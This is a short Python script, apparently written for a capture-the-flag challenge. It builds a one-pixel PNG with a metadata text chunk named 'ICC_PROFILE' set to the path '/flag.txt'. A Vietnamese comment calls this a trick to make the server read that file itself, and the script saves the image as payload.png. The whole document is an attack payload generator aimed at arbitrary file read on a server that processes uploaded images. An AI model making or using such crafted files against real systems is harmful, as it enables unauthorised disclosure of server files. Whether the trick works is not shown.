from PIL import Image, PngImagePlugin

img = Image.new("RGB", (1, 1), (255, 255, 255))
meta = PngImagePlugin.PngInfo()

# Trick: set profile ICC path để server tự đọc
meta.add_text("ICC_PROFILE", "/flag.txt")

img.save("payload.png", "PNG", pnginfo=meta)
print("[+] Payload saved as payload.png")
